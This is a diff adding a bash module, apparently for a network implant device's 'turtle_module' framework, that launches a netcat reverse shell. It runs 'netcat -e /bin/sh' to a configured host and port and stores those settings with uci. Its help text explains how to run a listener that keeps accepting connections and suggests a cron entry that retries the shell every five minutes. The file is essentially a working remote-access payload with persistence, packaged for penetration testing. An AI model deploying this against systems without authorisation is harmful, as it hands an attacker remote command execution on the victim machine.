@@ -1,0 +1,105 @@
+#!/bin/bash /usr/lib/turtle/turtle_module
+VERSION="1.0"
+DESCRIPTION="NetCat Reverse Shell"
+CONF=/tmp/netcatrevshell.form
+
+: ${DIALOG_OK=0}
+: ${DIALOG_CANCEL=1}
+: ${DIALOG_HELP=2}
+: ${DIALOG_EXTRA=3}
+: ${DIALOG_ITEM_HELP=4}
+: ${DIALOG_ESC=255}
+
+function start {
+  touch /tmp/netcat.pid
+  if kill -0 $(cat /tmp/netcat.pid) 2>/dev/null; then
+    echo "NetCat Reverse Shell already running"
+  else
+    if [ -s /etc/config/netcatrevshell ]
+    then
+      host=$(uci get netcatrevshell.host)
+      port=$(uci get netcatrevshell.port)
+      echo "Starting NetCat Reverse Shell to $host:$port"
+      netcat -e /bin/sh "$host" "$port" & echo $! > /tmp/netcat.pid
+    else
+      echo "NetCat Reverse Shell not configured"
+    fi
+  fi
+}
+
+function stop {
+  touch /tmp/netcat.pid
+  if kill -0 $(cat /tmp/netcat.pid) 2>/dev/null; then
+    echo "Stopping NetCat Reverse Shell"
+    kill $(cat /tmp/netcat.pid)
+    kill $(ps | grep [/]bin/sh | awk '{print $1}')
+  else
+    echo "NetCat Reverse Shell not running"
+  fi
+}
+
+function status {
+  if [ -s /tmp/netcat.pid ]
+  then
+    if kill -0 $(cat /tmp/netcat.pid) 2>/dev/null; then
+      echo "1"
+    else
+      echo "0"
+    fi
+  else
+    echo "0"
+  fi
+}
+
+function configure {
+  if [ -s /etc/config/netcatrevshell ]
+  then
+    nc_host=$(uci get netcatrevshell.host)
+    nc_port=$(uci get netcatrevshell.port)
+  else
+    touch /etc/config/netcatrevshell
+  fi
+
+  dialog --ok-label "Submit" \
+    --help-button \
+    --title "NetCat Reverse Shell Configuration" \
+    --form "\n\
+This module initiates a simple TCP reverse shell (/bin/sh) using NetCat to the specified host/port.\n \n\n" 11 60 2\
+    "Host:"		1 1	"$nc_host"		1 12 200 0 \
+    "Port:"		2 1	"$nc_port"		2 12 200 0 \
+  2>$CONF
+
+  return=$?
+
+  case $return in
+    $DIALOG_OK)
+      cat $CONF | { 
+        read -r nc_host
+        read -r nc_port
+        touch /etc/config/netcatrevshell
+        uci set netcatrevshell.host="$nc_host"
+        uci set netcatrevshell.port="$nc_port"
+        uci commit netcatrevshell
+        rm $CONF
+        clear
+      };;
+    $DIALOG_CANCEL)
+      rm $CONF
+      clear
+      exit;;
+    $DIALOG_HELP)
+      dialog --title "Help" \
+        --msgbox "\
+This very basic Reverse Shell uses NetCat to bind a shell from /bin/sh to the specified host and port.\n\n\
+A netcat listener should be configured to accept the incoming connection. For example:\n\n\
+netcat -l -v -p 8080\n\n\
+You may wish to keep the netcat listener running and accepting connections even after a disconnect. Some versions of netcat support the '-k' argument. Alternatively, on Linux, one may use the oneliner 'while true; do netcat -lvp 8080; done' to restart after disconnects.\n\n\
+When started, this module will not spawn a new instance of netcat if it is already running.\n\n\
+In the event the netcat reverse shell dies, one may consider adding '*/5 * * * * start netcat-revshell' to the crontab to ensure a connection is attempted every 5 minutes. 
+" 20 60
+      configure
+      ;;
+    $DIALOG_ESC)
+      clear;;
+  esac
+}
